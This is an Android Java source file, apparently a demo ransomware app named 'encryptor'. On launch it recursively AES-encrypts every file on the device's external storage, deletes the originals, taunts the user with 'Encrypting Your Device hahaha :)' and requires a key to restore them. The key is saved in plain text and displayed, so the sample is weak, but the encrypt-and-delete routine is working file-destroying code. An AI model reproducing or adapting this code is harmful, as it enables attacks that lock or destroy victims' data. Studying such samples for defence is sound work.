/**
 * Created by herojeff on 2017. 5. 9..
 */

package com.herojeff.encryptor;

import android.Manifest;
import android.app.Activity;
import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;

import butterknife.BindView;
import butterknife.ButterKnife;

public class FileActivity extends Activity {
    ArrayList<String> all_files = new ArrayList<>();

    @BindView(R.id.edittext)
    EditText editText;
    @BindView(R.id.dec_button)
    Button dec_button;
    public static String salt = null;
    static String dekey;
    Encryptor encryptor;
    Decryptor decryptor;
    public int filecount;
    File checkEnc;
    File checkKey;
    ProgressDialog asyncDialog;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        PermissionListener permissionlistener = new PermissionListener() {
            @Override
            public void onPermissionGranted() {
            }

            @Override
            public void onPermissionDenied(ArrayList<String> deniedPermissions) {
                Toast.makeText(getApplicationContext(), "Permission Denied\n" + deniedPermissions.toString(), Toast.LENGTH_LONG).show();
            }
        };
        new TedPermission(this)
                .setPermissionListener(permissionlistener)
                .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                .setPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                .check();

        asyncDialog = new ProgressDialog(FileActivity.this);
        asyncDialog.setCanceledOnTouchOutside(false);
        checkEnc = new File(Environment.getExternalStorageDirectory() + "/herojeff/encryption.flag");
        if (!isFileExist(checkEnc)) {
            String SALTCHARS = "abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder temp = new StringBuilder();
            Random rnd = new Random();
            while (temp.length() < 16) { // length of the random string.
                int index = (int) (rnd.nextFloat() * SALTCHARS.length());
                temp.append(SALTCHARS.charAt(index));
            }
            salt = temp.toString();


            final String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) { // we can read the External Storage...
                getAllFilesOfDir(Environment.getExternalStorageDirectory(), 1);
            }
            filecount = all_files.size();

            encryptor = new Encryptor();
            encryptor.execute();

            Toast.makeText(this, salt, Toast.LENGTH_LONG).show();
        } else {
            Toast.makeText(this, "Welcome Back!\nInput Key to Decrypt", Toast.LENGTH_SHORT).show();
            dec_button.setClickable(true);
            checkKey = new File(Environment.getExternalStorageDirectory() + "/herojeff/key.txt");
            readFile(checkKey);
            sb.deleteCharAt(sb.length() - 1);
            salt = sb.toString();
        }

    }


    public void restore(View v) {
        boolean decFlag = false;
        dekey = editText.getText().toString();
        if (dekey.equals("")) {
            Toast.makeText(this, "You must input the key!", Toast.LENGTH_LONG).show();
            decFlag = false;
        } else if (salt == null) {
            Toast.makeText(this, "Check for key.txt\nsalt broken!", Toast.LENGTH_LONG).show();
            decFlag = false;
        } else if (!isFileExist(checkEnc)) {
            Toast.makeText(this, "Device not encypted!", Toast.LENGTH_SHORT).show();
        } else if (dekey.equals(salt)) {
            decFlag = true;
        } else {
            Toast.makeText(this, "Key incorrect!", Toast.LENGTH_SHORT).show();
            Toast.makeText(this, "salt : " + salt + "\ndekey : " + dekey, Toast.LENGTH_LONG).show();
            Toast.makeText(this, "salt : " + salt + "\ndekey : " + dekey, Toast.LENGTH_LONG).show();
            decFlag = false;
        }

        if (decFlag) {
            Toast.makeText(this, "Initializing Decryption", Toast.LENGTH_SHORT).show();
            all_files.clear();
            final String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) { // we can read the External Storage...
                getAllFilesOfDir(Environment.getExternalStorageDirectory(), 0);
            }

            decryptor = new Decryptor();
            decryptor.execute();
        }
    }


    private void getAllFilesOfDir(File directory, int mode) {//mode 0 : restore, 1 : encrypt

        final File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file != null) {
                    if (file.isDirectory()) { // it is a folder...
                        getAllFilesOfDir(file, mode);
                    } else { // it is a file...
                        if (!file.getName().endsWith(".enc") && mode == 1)
                            all_files.add(file.getAbsolutePath());
                        else if (file.getName().endsWith(".enc") && mode == 0)
                            all_files.add(file.getAbsolutePath());
                    }
                }
            }
        }
    }

    private class Encryptor extends AsyncTask<Void, Integer, Void> {

        @Override
        protected void onPreExecute() {
            asyncDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            asyncDialog.setMessage("Encrypting Your Device\nhahaha :)");
            asyncDialog.setMax(filecount);
            asyncDialog.show();
            super.onPreExecute();
        }


        @Override
        protected Void doInBackground(Void... params) {
            for (int i = 0; i < all_files.size(); i++) {
                FileInputStream fis = null;
                FileOutputStream fos = null;
                try {
                    fis = new FileInputStream(String.valueOf(all_files.get(i)));
                    fos = new FileOutputStream(all_files.get(i) + ".enc");
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }


// Length is 16 byte
// Careful when taking user input!!! https://stackoverflow.com/a/3452620/1188357
                SecretKeySpec sks = new SecretKeySpec(salt.getBytes(), "AES");
// Create cipher
                Cipher cipher = null;
                try {
                    cipher = Cipher.getInstance("AES");
                    cipher.init(Cipher.ENCRYPT_MODE, sks);
                } catch (Exception e) {
                    e.printStackTrace();
                }

// Wrap the output stream
                CipherOutputStream cos = new CipherOutputStream(fos, cipher);
// Write bytes
                int b;
                byte[] d = new byte[8];
                try {
                    while ((b = fis.read(d)) != -1) {
                        cos.write(d, 0, b);
                    }
                    File file = new File(String.valueOf(all_files.get(i)));
                    file.delete();
                } catch (Exception e) {
                    e.printStackTrace();
                }

// Flush and close streams.
                try {
                    cos.flush();
                    cos.close();
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                publishProgress(i);
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            asyncDialog.setProgress(values[0]);
            super.onProgressUpdate(values);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            asyncDialog.dismiss();
            dec_button.setClickable(true);
            makeDirectory(Environment.getExternalStorageDirectory() + "/herojeff/");
            try {
                File file = new File(Environment.getExternalStorageDirectory() + "/herojeff/key.txt");
                file.createNewFile();
                FileOutputStream fOut = new FileOutputStream(file);
                OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                myOutWriter.append(salt);
                myOutWriter.close();
                fOut.flush();
                fOut.close();
                Toast.makeText(FileActivity.this, "key saved in herojeff", Toast.LENGTH_LONG).show();
            } catch (IOException e) {
                e.printStackTrace();
                Toast.makeText(FileActivity.this, salt, Toast.LENGTH_LONG).show();
                Toast.makeText(FileActivity.this, salt, Toast.LENGTH_LONG).show();
                Toast.makeText(FileActivity.this, salt, Toast.LENGTH_LONG).show();
                Toast.makeText(FileActivity.this, salt, Toast.LENGTH_LONG).show();
                Toast.makeText(FileActivity.this, salt, Toast.LENGTH_LONG).show();
            }

            try {
                File file2 = new File(Environment.getExternalStorageDirectory() + "/herojeff/encryption.flag");
                file2.createNewFile();
            } catch (Exception e) {
                Toast.makeText(FileActivity.this, "Failed to create encryption.flag", Toast.LENGTH_SHORT).show();
            }
            super.onPostExecute(aVoid);
        }
    }

    private class Decryptor extends AsyncTask<Void, Integer, Void> {
        @Override
        protected void onPreExecute() {
            asyncDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            asyncDialog.setMessage("Decrypting...");
            asyncDialog.setMax(filecount);
            asyncDialog.show();
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... aVoid) {
            for (int i = 0; i < all_files.size(); i++) {
                FileInputStream fis = null;
                FileOutputStream fos = null;
                Cipher cipher = null;

                try {
                    fis = new FileInputStream(all_files.get(i));
                    StringBuilder str = new StringBuilder(all_files.get(i));
                    str.setLength(str.length() - 4);
                    fos = new FileOutputStream(str.toString());
                    SecretKeySpec sks = new SecretKeySpec(dekey.getBytes(), "AES");
                    cipher = Cipher.getInstance("AES");
                    cipher.init(Cipher.DECRYPT_MODE, sks);
                } catch (Exception e) {
                }

                CipherInputStream cis = new CipherInputStream(fis, cipher);
                int b;
                byte[] d = new byte[8];
                try {
                    while ((b = cis.read(d)) != -1) {
                        fos.write(d, 0, b);
                    }
                    File file = new File(all_files.get(i));
                    file.delete();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                try {
                    fos.flush();
                    fos.close();
                    cis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                publishProgress(i);
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            asyncDialog.setProgress(values[0]);
            super.onProgressUpdate(values);
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            asyncDialog.dismiss();
            Toast.makeText(FileActivity.this, "decryption finished", Toast.LENGTH_LONG).show();
            deleteFile(checkEnc);
            deleteFile(checkKey);
            super.onPostExecute(aVoid);
        }

    }

    StringBuilder sb = new StringBuilder();

    private void readFile(File file) {
        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
                sb.append('\n');
            }
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private boolean isFileExist(File file) {
        boolean result;
        if (file != null && file.exists()) {
            result = true;
        } else {
            result = false;
        }
        return result;
    }


    private boolean deleteFile(File file) {
        boolean result;
        if (file != null && file.exists()) {
            file.delete();
            result = true;
        } else {
            result = false;
        }
        return result;
    }

    private File makeDirectory(String dir_path) {
        File dir = new File(dir_path);
        if (!dir.exists()) {
            dir.mkdirs();
        } else {
        }

        return dir;
    }

    public void ease(View v) {
        if (isFileExist(checkEnc)) {
            dekey = salt;

            Toast.makeText(this, "Initializing Decryption", Toast.LENGTH_SHORT).show();
            all_files.clear();
            final String state = Environment.getExternalStorageState();
            if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) { // we can read the External Storage...
                getAllFilesOfDir(Environment.getExternalStorageDirectory(), 0);
            }
            decryptor = new Decryptor();
            decryptor.execute();
        } else
            Toast.makeText(this, "Device Safe", Toast.LENGTH_SHORT).show();
    }
}
